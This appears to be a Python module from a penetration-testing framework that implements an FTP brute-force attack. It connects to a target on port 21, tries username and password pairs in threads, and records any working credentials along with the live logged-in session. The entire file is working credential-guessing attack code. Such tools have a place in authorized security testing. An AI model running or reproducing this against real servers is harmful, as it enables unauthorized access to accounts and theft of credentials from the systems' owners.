from jframework.modules.login._bruteforce import _Bruteforce
import ftplib
import sys


class Ftpbruteforce(_Bruteforce):

    def __init__(self):
        super(Ftpbruteforce,self).__init__()
        self.single_port = 21

    def worker(self, user, password):

        ftp = ftplib.FTP()
        ftp.connect(host=self.host, port=self.single_port, timeout=7)
        try:
            ftp.login(user, password)
            self.print_result(user, password, error=False)
            self.lock.acquire()
            self.add_credential(user, password, "ftp")
            self.add_session(ftp, user, "ftp")
            self.lock.release()
        except Exception as e:
            if self.verb:
                self.print_result(user, password, error=True)

            ftp.close()

        self.num_threads -= 1
        sys.exit(0)

    def run(self):
        ftp = ftplib.FTP()
        try:
            ftp.connect(host=self.host, port=self.single_port, timeout=7)
        except:
            print("{} Connection problem.".format(self.host))
            return None, None
        ftp.close()

        super(Ftpbruteforce, self).run()

        return self.sessions, self.credentials